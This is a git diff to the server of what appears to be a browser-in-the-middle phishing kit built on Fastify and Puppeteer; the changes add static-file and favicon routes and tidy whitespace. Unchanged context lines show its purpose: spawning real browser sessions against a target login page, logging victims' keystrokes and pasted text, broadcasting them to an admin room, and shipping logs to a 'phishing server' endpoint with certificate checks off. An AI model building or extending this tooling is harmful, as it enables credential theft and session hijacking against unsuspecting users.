@@ -12,7 +12,7 @@ import resize_window from './resize_window.js'
 import replace from 'stream-replace'
 import Xvfb from 'xvfb'
 
-//import admin config 
+//import admin config
 const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
 //import custom target configs
 const targets = JSON.parse(fs.readFileSync('./targets.json', 'utf8'));
@@ -40,12 +40,12 @@ try {
 }
 
 var ship_logs = function(log_data){
-  var headers = { 
+  var headers = {
     'Content-Type': 'application/json',
     'Cookie': pm.admin_cookie
-  }   
+  }
   //send logs off to our phishing server/logging endpoint
-  got.post(pm.logging_endpoint , { 
+  got.post(pm.logging_endpoint , {
     headers: headers,
     https: {rejectUnauthorized: false},
     json: log_data
@@ -54,7 +54,7 @@ var ship_logs = function(log_data){
     console.log("Error:" + err)
     //console.log("Error:" + err.response.body)
     return
-  })  
+  })
 }
 
 const fastify = Fastify({
@@ -150,10 +150,92 @@ fastify.route({
 
 fastify.route({
   method: ['GET'],
+  url: '/switch.js',
+  handler: async function (req, reply) {
+    let stream = fs.createReadStream(__dirname + "/node_modules/light-switch-bootstrap/switch.js")
+    reply.type('text/javascript').send(stream)
+  }
+})
+
+//Logo
+fastify.route({
+  method: ['GET'],
+  url: '/images/*',
+  handler: async function (req, reply) {
+    const requestedFile = req.params['*'];
+    const filePath = path.join(__dirname, 'favicons', requestedFile);
+
+    // Check if the requested file is within the specified directory
+    if (!filePath.startsWith(path.join(__dirname, 'favicons'))) {
+      return reply.status(403).send('Forbidden');
+    }
+
+    // Check if the file exists before attempting to read it
+    if (!fs.existsSync(filePath)) {
+      return reply.status(404).send('Not Found');
+    }
+
+    // Read and stream the file if it exists
+    const stream = fs.createReadStream(filePath);
+    reply.type('image/png').send(stream);
+  }
+})
+
+fastify.route({
+  method: ['GET'],
   url: '/jquery.min.js',
   handler: async function (req, reply) {
     let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
     reply.type('text/javascript').send(stream)
+  }
+})
+
+//static .css files
+fastify.route({
+    method: ['GET'],
+    url: '/static/css/*',
+    handler: async function (req, reply) {
+        const requestedFile = req.params['*'];
+        const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/css/', requestedFile);
+
+        // Check if the requested file is within the specified directory
+        if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/css/'))) {
+          return reply.status(403).send('Forbidden');
+        }
+
+        // Check if the file exists before attempting to read it
+        if (!fs.existsSync(filePath)) {
+          return reply.status(404).send('Not Found');
+        }
+
+        // Read and stream the file if it exists
+        const stream = fs.createReadStream(filePath);
+        reply.type('text/css').send(stream);
+  }
+})
+
+//static .js files
+fastify.route({
+    method: ['GET'],
+    url: '/static/js/*',
+    handler: async function (req, reply) {
+        const requestedFile = req.params['*'];
+        const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/js/', requestedFile);
+
+        // Check if the requested file is within the specified directory
+        if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/js/'))) {
+          return reply.status(403).send('Forbidden');
+        }
+
+        // Check if the file exists before attempting to read it
+        if (!fs.existsSync(filePath)) {
+          return reply.status(404).send('Not Found');
+        }
+
+        // Read and stream the file if it exists
+        const stream = fs.createReadStream(filePath);
+        reply.type('text/javascript').send(stream);
+
   }
 })
 
@@ -178,7 +260,7 @@ async function get_browser(target_page){
   //we'll use this same ID to track unique browser instances for socket renegotiations etc. as well
   let browser_id = Math.random().toString(36).slice(2)
   fs.mkdirSync(`./user_data/${browser_id}`)
-  
+
   let browser = await puppeteer.launch({
     headless: false,
     ignoreHTTPSErrors: true,
@@ -234,9 +316,9 @@ async function get_browser(target_page){
 }
 
 fastify.ready(async function(err){
-  if (err) throw err 
+  if (err) throw err
   var empty_phishbowl = await get_browser(target.login_page)
-  fastify.io.use((socket, next) => { 
+  fastify.io.use((socket, next) => {
     const token = socket.handshake.auth.token;
     if(token === config.socket_key){
       admins.push(socket.id)
@@ -249,7 +331,7 @@ fastify.ready(async function(err){
         browser.socket_id = socket.id
       }
       next();
-    }    
+    }
   });
   browsers.push(empty_phishbowl)
   fastify.io.on('connect', function(socket){
@@ -261,7 +343,7 @@ fastify.ready(async function(err){
         if(frame.parentFrame() === null) {
           if(browser.controller_socket !== undefined){
             fastify.io.to(browser.controller_socket).emit('push_state', frame.url().split('/').slice(3).join('/'))
-	  }
+          }
         }
       })
     })
@@ -367,7 +449,7 @@ fastify.ready(async function(err){
           browser.keylog = browser.keylog + paste_data
           browser.keylog_file.write(paste_data)
           fastify.io.to('admin_room').emit('keylog', socket.id, browser.keylog)
-	}
+        }
         await browser.target_page.keyboard.type(paste_data)
       }
     })
